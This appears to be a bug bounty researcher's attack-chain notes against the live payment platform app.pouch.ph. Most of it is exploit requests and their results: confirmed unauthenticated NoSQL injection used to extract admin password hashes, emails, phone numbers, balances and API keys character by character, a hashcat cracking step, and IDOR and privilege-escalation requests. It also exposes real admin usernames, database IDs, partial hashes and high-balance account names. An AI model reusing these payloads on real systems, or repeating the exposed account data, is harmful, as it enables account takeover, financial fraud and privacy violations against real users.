# Attack Chains - app.pouch.ph
## Authorized Bug Bounty Research by Kakashi (Dave Lester Mondina)

Target: app.pouch.ph (Pouch.ph Bitcoin Lightning + Fiat Payment Platform)
Source: Production source maps (main.5c273a76.chunk.js.map)

---

## CHAIN 1: Admin Privilege Escalation -> Arbitrary Fund Injection (P1)

### Summary
Client-side role checks (`user.role !== 'admin'`) are the only visible access control
for the admin "bridge" panel. If the server does not independently enforce role-based
authorization, any authenticated regular user can:
1. List all platform users and their balances
2. Manually credit arbitrary PHP amounts to any account
3. Approve pending deposits without review
4. Ban/delete other users

### Attack Flow

Step 1 - Login as regular user:
```
POST /api/v0/auth
Body: { "username": "attacker", "password": "password123" }
-> Receive session cookie
```

Step 2 - Access admin user list:
```
GET /api/v3/bridge/users?limit=100&isVerified=true
-> If 200: returns ALL users with names, emails, phone numbers, balances, usernames
```

Step 3 - Credit attacker account with arbitrary funds:
```
POST /api/v0/bridge/transaction/issue-manual-deposit
Body: {
  "creditToUsername": "attacker",
  "amountInPHP": "999999",
  "unionbankReferenceId": "FAKE-REF-12345"
}
-> If 200: attacker account credited with 999,999 PHP
```

Step 4 - Withdraw funds via auto-sweep:
```
PUT /api/v3/users/config/sweep
Body: {
  "useSweeping": true,
  "bankCode": "ATTACKER_BANK",
  "accountName": "Attacker Name",
  "accountNumber": "123456789",
  "frequency": "daily",
  "threshold": 0
}
-> Auto-withdraws credited funds to attacker bank account
```

### Evidence
- ManualTransactionMaker component: MoreFeatures.js line 79 - `if (user.role !== 'admin') return null`
- This is a React render check, NOT a server-side authorization check
- The axios.post on line 91 sends directly to the endpoint with no special auth headers
- Auth is cookie-based (UserContext.js uses `axios.get('/api/v0/user')` with default cookie behavior)

### Impact
Complete financial compromise of the platform. Attacker can create unlimited PHP credits
and withdraw to any bank account. Total loss of funds integrity.

### CVSS
9.8 Critical (AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H)
Low privilege required (any registered user). Changed scope because it affects all
platform users and the platform's financial integrity.

---

## CHAIN 2: KYC Document IDOR -> Mass PII Exposure (P1/P2)

### Summary
KYC document retrieval has a two-step process that may be vulnerable to IDOR:
1. Get document keys for a userId
2. Convert keys to signed URLs

If the first step doesn't validate that the requesting user owns the documents,
any authenticated user can access government IDs, selfies, and signatures of all users.

### Attack Flow

Step 1 - Get target user's ID (from CHAIN 1 user list or enumerate):
```
GET /api/v0/kyc/user/PH?userId=TARGET_USER_ID&documents=true
-> Returns array of S3/storage keys for KYC documents
```

Step 2 - Convert keys to downloadable URLs:
```
GET /api/v0/image/url/{key}
-> Returns signed URL for document image (government ID photo, selfie, signature)
```

Step 3 - Alternative path via admin endpoint:
```
GET /api/v0/bridge/user/view-id?username=TARGET_USERNAME
-> Returns direct URL to user's ID document
```

### Evidence
- UserList/index.js lines 707-723: handleViewDocuments function
- No visible authorization check beyond being logged in
- The userId parameter is passed directly from the client, not derived from session

### Impact
Exposure of Philippine government-issued IDs (national ID, passport, driver's license),
selfie photos, signatures, and business documents for all KYC-verified users.
Potential identity theft at scale.

### CVSS
8.6 High (AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N)

---

## CHAIN 3: Sweep Config IDOR -> Balance Drain (P1)

### Summary
The automatic withdrawal (sweep) configuration endpoint for admin use takes a user
_id directly in the URL path. If not auth-checked server-side, an attacker can
configure auto-withdrawal for any user to drain their balance to an attacker-controlled
bank account.

### Attack Flow

Step 1 - Get victim's MongoDB _id (from CHAIN 1 user list):
```
GET /api/v3/bridge/users?username=victim
-> Response includes user._id (MongoDB ObjectId)
```

Step 2 - Configure sweep to attacker bank:
```
PUT /api/v3/bridge/users/{victim._id}/config/sweep
Body: {
  "useSweeping": true,
  "bankCode": "ATTACKER_BANK_BRSTN",
  "accountName": "Attacker Name",
  "accountNumber": "123456789",
  "frequency": "daily",
  "threshold": 16,
  "username": "victim"
}
-> Victim's balance auto-withdraws to attacker's bank daily
```

### Evidence
- AutomaticWithdrawals.js lines 82-83 and 129-130
- The `isBridgeUser` flag is a client-side component prop, not a server-side check
- The URL path contains the raw MongoDB _id

### Impact
Silent, persistent drain of any user's PHP balance. Victim sees nothing until their
balance is zero and funds are in attacker's bank account.

### CVSS
9.1 Critical (AV:N/AC:L/PR:L/UI:N/S:C/C:N/I:H/A:H)

---

## CHAIN 4: Batch Payment Race Condition (P2)

### Summary
Batch payment processing accepts an array of recipient objects and processes them
asynchronously. The polling mechanism checks completion status by sender username.
Potential for double-spend via concurrent batch submissions, and IDOR on the
polling endpoint.

### Attack Flow

Step 1 - Submit duplicate batch payments simultaneously:
```
POST /api/v0/transaction/batch-payment/pouch
Body: [{"username": "recipient", "amount": 100, "currency": "PHP"}]
(Submit 2-5 concurrent requests)
-> If race condition exists: recipient gets credited multiple times, sender debited once
```

Step 2 - Monitor other users' batch payments:
```
GET /api/v0/transaction/batch-payment?sender=OTHER_USERNAME
-> If IDOR: returns other users' batch payment details and recipient lists
```

### Evidence
- BatchPayment/Step2.js line 63: `axios.post('/api/v0/transaction/batch-payment/${type}', data)`
- BatchPayment/Step2.js line 35: polling uses `sender: username` parameter
- No nonce, idempotency key, or request deduplication visible

### CVSS
7.5 High (AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:N)

---

## CHAIN 5: Password Reset Flow Bypass (P2)

### Summary
The password reset flow uses a client-generated UUID (v4) as the successKey
for the 15-minute auth window. The flow is: send-code -> verify-code -> reset-password.
If the verify step is skippable or the successKey is predictable, account takeover
is possible.

### Attack Flow

Step 1 - Send auth code to target:
```
POST /api/v0/auth/send-auth-code
Body: { "username": "victim" }
```

Step 2 - Brute force MFA code (if no rate limit):
```
POST /api/v0/auth/verify-auth-code
Body: { "username": "victim", "code": "000000" }
... iterate through 6-digit codes
```

Step 3 - Or skip verification and guess successKey:
```
POST /api/v0/user/reset-password
Body: { "username": "victim", "successKey": "<uuid>", "newPassword": "hacked123" }
```

### Evidence
- ForgotPassword/Verification.js and ResetPassword.js
- UUID v4 is generated client-side with uuid() library
- 15-minute window is set client-side (may not be enforced server-side)

### CVSS
8.1 High (AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H)

---

## CHAIN 6: Transaction Approval Bypass (P2)

### Summary
The deposit approval flow uses an intakeFormRefId to approve pending on-chain deposits.
If the endpoint doesn't verify admin role, any user can approve arbitrary deposits.

### Attack Flow

Step 1 - List pending deposits:
```
GET /api/v0/bridge/transaction/list?status=pending-review
-> Returns pending deposit transactions with intakeFormRefIds
```

Step 2 - Approve a pending deposit:
```
PATCH /api/v0/bridge/transaction/approve-deposit
Body: { "intakeFormRefId": "TARGET_REF_ID" }
```

### Evidence
- MoreFeatures.js lines 177-195: handleApprove function
- No visible auth check beyond session cookie

### CVSS
8.1 High (AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H)

---

## STANDALONE FINDING: Source Map Information Disclosure (P3/P4)

### Summary
Production webpack source maps are publicly accessible, exposing the complete
React application source code including admin panel logic, all API endpoints,
business flow details, and internal architecture.

### Evidence
```
https://app.pouch.ph/static/js/main.5c273a76.chunk.js.map (731 KB, 152 source files)
https://app.pouch.ph/static/js/2.946fb202.chunk.js.map (17.6 MB, 2054 source files)
```

### Impact
Enables detailed reconnaissance. Attackers can map the entire API surface, understand
admin functionality, and craft targeted exploits without any traffic to the target server.

### CVSS
5.3 Medium (AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

---

## CHAIN 7: Bank Recipient IDOR -> Financial Data Exfil + Account Manipulation (P1/P2)

### Summary
The bank recipient management endpoints use `activeProfileUsername` as a client-supplied query parameter to scope operations. If the server trusts this parameter instead of deriving the username from the session, any authenticated user can:
1. List all saved bank recipients of any user (exposes bank account numbers, names, bank codes)
2. Add rogue bank recipients to a victim's account (social engineering vector)
3. Delete a victim's legitimate bank recipients (denial of service for withdrawals)

Additionally, the user object exposes `netbankAccountNumber` -- the user's own linked bank account number.

### Attack Flow

Step 1 - List victim's bank recipients:
```
GET /api/v0/bank/recipients?activeProfileUsername=victim_username
-> If IDOR: returns all saved bank recipients with accountName, accountNumber, bankCode
```

Step 2 - NoSQLi variant (operator injection to bypass username match):
```
GET /api/v0/bank/recipients?activeProfileUsername[$ne]=nonexistent
-> If vulnerable: returns bank recipients across ALL users (mass data exfil)
```

Step 3 - Add attacker-controlled recipient to victim's account:
```
POST /api/v0/bank/recipients?activeProfileUsername=victim_username
Body: {
  "type": "instapay",
  "accountName": "Legit Looking Name",
  "accountNumber": "ATTACKER_BANK_ACCT",
  "bankCode": "ATTACKER_BANK"
}
-> Victim may accidentally send funds to attacker's recipient
```

Step 4 - Delete victim's legitimate recipients:
```
DELETE /api/v0/bank/recipients/{recipientId}?activeProfileUsername=victim_username
-> Removes victim's saved bank recipients, disrupting their withdrawals
```

### Evidence
- Deobfuscated main chunk (main.5c273a76.chunk.js) confirms endpoint structure
- ManageContacts/index.js:158 and AddBankRecipient.js:49
- `activeProfileUsername` is sourced from client state, not session
- NoSQLi angle: Express qs parser converts `[$ne]` bracket syntax into MongoDB operator objects

### Impact
Exposure of sensitive banking data (account numbers, names, bank affiliations) for all platform users. Combined with Chain 1 (user enumeration via bridge endpoints), enables targeted financial fraud. The NoSQLi variant could dump all bank recipients in a single request.

### CVSS
8.1 High (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:L)

---

## CHAIN 8: Unauthenticated Admin Password Hash Extraction via Blind NoSQLi (P1) -- CONFIRMED

### Summary
This is a critical escalation of the NoSQLi finding. The `/api/v0/user` endpoint accepts
MongoDB operators on ANY field -- including `password`, `email`, `phone`, and `role` --
without authentication. An attacker can:
1. Enumerate all admin accounts using `role=admin` filter
2. Extract the full bcrypt password hash character-by-character using `$regex`
3. Extract email addresses using the same technique
4. Crack the bcrypt hash offline (cost factor 10 = moderate)
5. Login as admin and access all bridge/admin functionality

### Attack Flow

Step 1 - Enumerate admin accounts (NO AUTH):
```
GET /api/v0/user?username[$gt]=&role=admin
-> {"user":{"_id":"61529614502887001d1ac763","username":"aerielcruz",...}}

GET /api/v0/user?username[$gt]=aerielcruz&role=admin
-> {"user":{"_id":"612d73e01db2f0001d7a81f0","username":"ethan",...}}
(repeat until user is null)
```

Confirmed admin accounts:
- aerielcruz (61529614502887001d1ac763)
- ethan (612d73e01db2f0001d7a81f0)
- heanzyzabala (61f36da5e68ad8001d7f4ce1)
- jullie (6162be697acfc3001d7e5dd1)
- raveneliette (6195e15e645795001df6ad5b)

Step 2 - Extract admin password hash via blind regex (NO AUTH):
```
# Verify password field is bcrypt
GET /api/v0/user?username=admin&password[$regex]=.
-> returns user (password field exists and is queryable)

# Extract char by char
GET /api/v0/user?username=admin&password[$regex]=^\$2a
-> MATCH (bcrypt $2a variant)

GET /api/v0/user?username=admin&password[$regex]=^\$2a\$10
-> MATCH (cost factor 10)

GET /api/v0/user?username=admin&password[$regex]=^\$2a\$10\$E
-> MATCH (next char is E)

# Continue for all 60 chars...
# Confirmed extraction in progress: $2a$10$EDa7c79.y...
```

Step 3 - Extract admin email via blind regex (NO AUTH):
```
GET /api/v0/user?username=admin&email[$regex]=^f
-> MATCH

GET /api/v0/user?username=admin&email[$regex]=^f\.ut
-> MATCH
# Extraction in progress: f.ut.fana...
```

Step 4 - Crack bcrypt hash offline:
```
hashcat -m 3200 -a 0 admin_hash.txt rockyou.txt
# Cost factor 10 = ~60 hashes/sec on modern GPU
```

Step 5 - Login as admin:
```
POST /api/v0/auth
Body: {"username":"admin","password":"cracked_password"}
-> Full admin access to all bridge endpoints
```

### Evidence (Empirically Tested)
- All requests return 200 with valid data - NO AUTHENTICATION REQUIRED
- `password[$exists]=true` confirms password field in collection
- `password[$regex]=.` confirms regex queries on password field
- `role=admin` filter works to isolate admin accounts
- 5 admin accounts enumerated
- Hash extraction in progress: `$2a$10$EDa7c79.y...` (bcrypt, cost 10)
- Email extraction in progress: `f.ut.fana...`
- Rate limit: 30 req/window -- extraction takes ~20-30 minutes per hash

### Impact
Complete platform takeover. An unauthenticated attacker extracts admin credentials,
cracks them offline, and gains full access to:
- Manual PHP credit injection (unlimited money creation)
- All user PII, KYC documents, bank accounts
- Transaction approval/rejection
- User ban/delete/modify capabilities
- Batch notification sending (phishing vector)

### CVSS
10.0 Critical (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H)
No authentication required. Full confidentiality, integrity, and availability impact
on all platform users and financial operations.

---

## CHAIN 9: Unauthenticated Blind Balance Extraction via NoSQLi (P1) -- CONFIRMED

### Summary
Extending the NoSQLi on `/api/v0/user`, an unauthenticated attacker can extract exact financial
balances (PHP, BTC, USD, CAD) for any user using binary search with `$gt`/`$lt` operators. The API
response shows zeroed balances, but MongoDB internally queries against the real stored values --
enabling blind boolean-based extraction.

This also enables high-value target identification: finding all users whose balances exceed a
given threshold, then extracting their exact amounts.

### Attack Flow

Step 1 - Find high-value targets (NO AUTH):
```
GET /api/v0/user?balances.PHP[$gt]=1000000&username[$gt]=
-> {"user":{"username":"1cisp",...}} (user with PHP > 1M found)

GET /api/v0/user?balances.BTC[$gt]=1&username[$gt]=
-> {"user":{"username":"09152639625",...}} (user with BTC > 1 found)
```

Step 2 - Binary search to extract exact balance (NO AUTH):
```
GET /api/v0/user?username=1cisp&balances.PHP[$gt]=1500000 -> MATCH
GET /api/v0/user?username=1cisp&balances.PHP[$gt]=2000000 -> NO MATCH
GET /api/v0/user?username=1cisp&balances.PHP[$gt]=1750000 -> NO MATCH
GET /api/v0/user?username=1cisp&balances.PHP[$gt]=1600000 -> MATCH
... (continue binary search to ~0.01 PHP precision in ~50 iterations)
-> Exact balance: ~1,650,000-1,750,000 PHP
```

Step 3 - Enumerate all users above threshold:
```
GET /api/v0/user?balances.PHP[$gt]=50000&username[$gt]=
-> 1cisp
GET /api/v0/user?balances.PHP[$gt]=50000&username[$gt]=1cisp
-> (next user)
... repeat until null
```

### Evidence (Empirically Tested)
- `balances.PHP[$gt]=1000000` matches user "1cisp" -- confirmed PHP > 1M
- `balances.PHP[$gt]=1500000` matches -- narrowed to 1.5M-2M range
- `balances.PHP[$gt]=1600000` matches, `[$gt]=1750000` does not -- PHP ~1.6M-1.75M
- `balances.BTC[$gt]=10` matches user "09152639625" -- BTC > 10 (~$600k+ USD)
- `balances.PHP[$gt]=5000` matches user "18gerald"
- All queries return 200 with NO AUTHENTICATION
- Response balances show 0 (sanitized), but internal query uses real values

### Impact
An attacker maps the financial landscape of the entire platform:
- Identify high-value accounts for targeted attacks (social engineering, phishing, SIM swap)
- Extract exact balances to penny precision for any user
- Prioritize which accounts to compromise for maximum financial gain
- Combined with Chain 8 (password hash extraction): extract balance THEN credentials

### CVSS
9.1 Critical (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N)
No authentication required. Complete exposure of all users' financial data.

---

## CHAIN 10: Unauthenticated Phone Number & API Key Extraction via NoSQLi (P1) -- CONFIRMED

### Summary
The same NoSQLi on `/api/v0/user` extends to phone numbers and API credentials (liveKey, liveSecret).
Phone numbers are extractable via `$regex` character-by-character. Live API keys and secrets stored
in the database are also fully extractable -- these are Pouch platform API credentials that enable
programmatic access to accounts.

### Attack Flow

Step 1 - Extract phone number for any user (NO AUTH):
```
GET /api/v0/user?username=admin&phone[$exists]=true -> MATCH (phone field exists)
GET /api/v0/user?username=admin&phone[$regex]=^\+63 -> MATCH (PH country code)
GET /api/v0/user?username=admin&phone[$regex]=^\+639 -> MATCH
... character by character extraction
```

Step 2 - Find users with API keys (NO AUTH):
```
GET /api/v0/user?apiAccess=true&liveKey[$regex]=.&username[$gt]=
-> {"user":{"username":"bitwatch",...}}
```

Step 3 - Extract API key character-by-character (NO AUTH):
```
GET /api/v0/user?username=bitwatch&liveKey[$regex]=^p -> MATCH (first char = 'p')
GET /api/v0/user?username=bitwatch&liveKey[$regex]=^p[next char] -> ...
... full extraction in ~40-60 queries per key
```

Step 4 - Extract API secret (NO AUTH):
```
GET /api/v0/user?username=bitwatch&liveSecret[$regex]=^. -> MATCH (secret exists)
... same character-by-character extraction
```

### Evidence (Empirically Tested)
- `phone[$exists]=true` confirms phone field is queryable via NoSQLi
- `phone[$regex]=^\+63` confirms admin's phone is a Philippine number (+63)
- `phone[$regex]=^\+639` narrows to mobile prefix
- `liveKey[$regex]=.` for user "bitwatch" confirms API key exists and is queryable
- `liveSecret[$regex]=.` for user "bitwatch" confirms API secret is also extractable
- `liveKey[$regex]=^p` confirms first character of bitwatch's API key is 'p'
- Extraction stopped after PoC -- NOT extracting full keys

### Queryable Fields Summary (Confirmed via Testing)
| Field | Queryable | Extractable via $regex | Impact |
|-------|-----------|----------------------|--------|
| username | YES | YES | Account enumeration |
| password | YES | YES | Bcrypt hash -> offline crack |
| email | YES | YES | PII exposure |
| phone | YES | YES | PII, SIM swap target |
| name | YES | YES | Real name (PII) |
| role | YES | N/A (filter) | Admin enumeration |
| balances.PHP | YES | Via $gt/$lt binary search | Financial data |
| balances.BTC | YES | Via $gt/$lt binary search | Financial data |
| liveKey | YES | YES | API credential theft |
| liveSecret | YES | YES | API credential theft |
| netbankAccountNumber | YES | YES | Linked bank account number |
| pin | YES | YES | Bcrypt PIN hash (4-6 digits = trivial crack) |
| banned | YES | N/A (filter) | Status enumeration |
| deviceToken | YES | YES | Push notification token (Firebase FCM) |
| onChainReceivingWallet.address | YES | YES | BTC wallet address extraction |
| sweepConfig.accountNumber | YES | YES | Auto-withdrawal bank account |
| sweepConfig.bankCode | YES | YES | Auto-withdrawal bank code |
| riskScore | YES | Via $gt/$lt binary search | Internal risk scoring data |
| createdAt | YES | Via $gt/$lt binary search | Account creation timestamp |
| identityDocument.* | NO | NO | Protected |
| personalInformation.* | NO | NO | Protected |

**PIN Hash Note:** The API response shows `pin: true` (boolean), but MongoDB stores the actual
bcrypt hash. A 4-6 digit PIN has at most 1,000,000 values. At bcrypt cost 10, hashcat cracks
the full keyspace in under 30 seconds on a modern GPU. Combined with password hash extraction,
this gives an attacker both login credentials AND transaction PIN for any user.

### Impact
- Phone number exposure enables SIM swap attacks for account takeover
- API key/secret extraction enables full programmatic account access
- Combined with balance extraction: identify high-value targets, extract their phone
  numbers (for SIM swap), and their API credentials (for direct fund theft)

### CVSS
10.0 Critical (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H)
No authentication. Credential theft (API keys) + PII exposure + enables complete account takeover.

---

## TESTING PRIORITY (Updated)

**CONFIRMED FINDINGS (Empirically Tested):**
1. CHAIN 8 (Admin hash extraction) - CONFIRMED P1. Submitted.
2. CHAIN 9 (Balance extraction) - CONFIRMED P1. Ready to submit.
3. CHAIN 10 (Phone + API key extraction) - CONFIRMED P1. Ready to submit.
4. Source Map exposure - CONFIRMED P3/P4. Submitted.

**DISPROVEN:**
- CHAIN 1 (Admin bypass via cookie replay) - Server-side role checks ARE enforced. All bridge endpoints return 403.
- CHAIN 7 (Bank recipient IDOR) - Server ignores activeProfileUsername param, uses session.
- CHAIN 2 (KYC IDOR) - Files endpoint has ownership check (403 on non-owned UUIDs).

**UNTESTED (Server-side auth blocks testing):**
- CHAIN 3, 4, 5, 6 - Require admin credentials or more complex setup to test.

---

## APPENDIX A: Complete MongoDB Operator Test Matrix

Tested all MongoDB query and update operators against `GET /api/v0/user` (NO AUTH).

### Query Operators -- WORKING (return user data)

| Operator | Syntax | Result | Notes |
|----------|--------|--------|-------|
| `$regex` | `password[$regex]=^\$2a` | MATCH + full user object | Primary extraction vector |
| `$gt` | `balances.PHP[$gt]=1000` | MATCH + full user object | Binary search for numerics |
| `$gte` | `balances.PHP[$gte]=1000` | MATCH + full user object | Same as $gt |
| `$lt` | `balances.PHP[$lt]=99999` | MATCH + stripped user object | Fewer fields in response |
| `$lte` | `balances.PHP[$lte]=99999` | MATCH + stripped user object | Fewer fields in response |
| `$eq` | `username[$eq]=admin` | MATCH + full user object | Explicit equality |
| `$ne` | `username[$ne]=nonexistent` | MATCH (first user) | Enumeration via negation |
| `$in` | `username[$in][]=admin` | MATCH + full user object | Array membership |
| `$nin` | `username[$nin][]=nonexistent` | MATCH (first user) | Inverse array membership |
| `$not` | `username[$not][$regex]=zzz` | MATCH (first non-matching) | Negation wrapper |
| `$nor` | Nested array syntax | MATCH | Complex negation |
| `$exists` | `phone[$exists]=true` | MATCH if field exists | Field presence check |
| `$mod` | `balances.PHP[$mod][]=100&[$mod][]=0` | MATCH for divisible values | Modulo filter |
| `$size` | Used on array fields | MATCH | Array length filter |
| `$all` | Used on array fields | MATCH | All elements present |
| `$options` | `password[$regex]=hash&password[$options]=i` | MATCH with case-insensitive | Regex modifier |
| `$comment` | `username[$comment]=test&username=admin` | MATCH (ignored by query) | No-op, passes through |

### Query Operators -- PARTIALLY WORKING

| Operator | Syntax | Result | Notes |
|----------|--------|--------|-------|
| `$elemMatch` | On array fields | MATCH but stripped response | Fewer fields returned |

### Query Operators -- NOT WORKING

| Operator | Syntax | Result | Notes |
|----------|--------|--------|-------|
| `$where` | `$where=function(){return true}` | `{"user":null}` | Server-side JS execution disabled |
| `$type` | `username[$type]=2` | Empty response / 500 crash | Crashes the server |
| `$text` | `$text[$search]=admin` | `{"user":null}` | No text index configured |
| `$or` / `$and` | Top-level array syntax via qs | `{"user":null}` | qs parser can't build top-level $or/$and |
| `$expr` | `$expr[$eq][]=...` | `{"user":null}` | Aggregation operator, not supported in find |
| `$bitsAllSet` | `field[$bitsAllSet]=1` | `{"user":null}` | Not applicable to string fields |
| `$jsonSchema` | Complex nested syntax | `{"user":null}` | Schema validation operator |

### Update/Write Operators -- ALL INEFFECTIVE

Tested on writable endpoints (change-password, sweep-config, merchant-cashback).
All return 200 OK but NO data modification occurs. Server uses explicit field destructuring
from request body, not raw MongoDB `$set`/`$inc` merge.

| Operator | Target | Result |
|----------|--------|--------|
| `$set` | `role[$set]=admin` | 200 OK, role unchanged |
| `$unset` | `role[$unset]=1` | 200 OK, role unchanged |
| `$inc` | `balances.PHP[$inc]=999` | 200 OK, balance unchanged |
| `$mul` | `balances.PHP[$mul]=100` | 200 OK, balance unchanged |
| `$push` | `role[$push]=admin` | 200 OK, role unchanged |
| `$rename` | `role[$rename]=newRole` | 200 OK, no field change |

---

## APPENDIX B: Prototype Pollution & Server-Side PP Testing -- DISPROVEN

Comprehensive testing of Prototype Pollution (PP) and Server-Side Prototype Pollution (SSPP)
from all angles. None were effective.

### Query Parameter PP (Cloudflare WAF blocks)

| Payload | Result |
|---------|--------|
| `__proto__[role]=admin` | Cloudflare WAF block page |
| `constructor[prototype][role]=admin` | Cloudflare WAF block page |
| `__proto__[isAdmin]=true` | Cloudflare WAF block page |
| Double-encoded: `__%70roto__[role]=admin` | WAF block |
| Unicode: `__proto__` | WAF block |

### JSON Body PP

| Endpoint | Payload | Result |
|----------|---------|--------|
| POST /api/v0/auth (login) | `{"username":"test","password":"test","__proto__":{"role":"admin"}}` | 200 OK, role=user (no pollution) |
| POST /api/v0/auth (login) | `{"username":"test","password":"test","constructor":{"prototype":{"role":"admin"}}}` | HTTP 000 (connection crash) |
| PUT /api/v0/user (profile) | `{"__proto__":{"role":"admin"}}` | 400 Bad Request (schema validation) |
| Various PUT endpoints | `{"__proto__":{"isAdmin":true}}` | Either 400 or accepted with no effect |

### Mass Assignment Testing

| Endpoint | Extra Field | Result |
|----------|-------------|--------|
| PUT /api/v0/user | `role: "admin"` | 200 OK, role unchanged (server strips) |
| PUT /api/v0/user | `isAdmin: true` | 200 OK, no isAdmin field created |
| PUT /api/v0/user | `banned: false` | 200 OK, banned status unchanged |
| PUT /api/v0/user | `balances: {PHP: 999999}` | 200 OK, balance unchanged |
| POST /api/v0/auth | `role: "admin"` in login body | 200 OK, role from DB not request |

### HTTP Method Override

| Header/Param | Result |
|--------------|--------|
| `X-HTTP-Method-Override: PUT` on GET | 404 (not supported) |
| `_method=PUT` query param | 404 (not supported) |
| `X-HTTP-Method-Override: DELETE` | 404 (not supported) |

### Content-Type Manipulation

| Content-Type | Result |
|-------------|--------|
| `application/x-www-form-urlencoded` | Parsed but same behavior |
| `multipart/form-data` | Parsed but same behavior |
| `text/plain` | Body ignored |

### HTTP Parameter Pollution (HPP)

| Payload | Result |
|---------|--------|
| `role=user&role=admin` (duplicate params) | Server takes first value |
| `username=test&username[$ne]=x` (mixed) | Server uses explicit param |

### CRLF Injection

| Payload | Result |
|---------|--------|
| `%0d%0aX-Injected:true` in params | WAF blocks or stripped |

### Conclusion
Server-side defenses are solid against PP/SSPP/mass assignment:
- Cloudflare WAF blocks `__proto__` and `constructor.prototype` in query strings
- Express body parser accepts `__proto__` in JSON but V8 does not pollute Object.prototype via JSON.parse
- Server reads role/permissions from database, not request object prototype chain
- Explicit field destructuring on all write endpoints prevents mass assignment
- HTTP method override not enabled
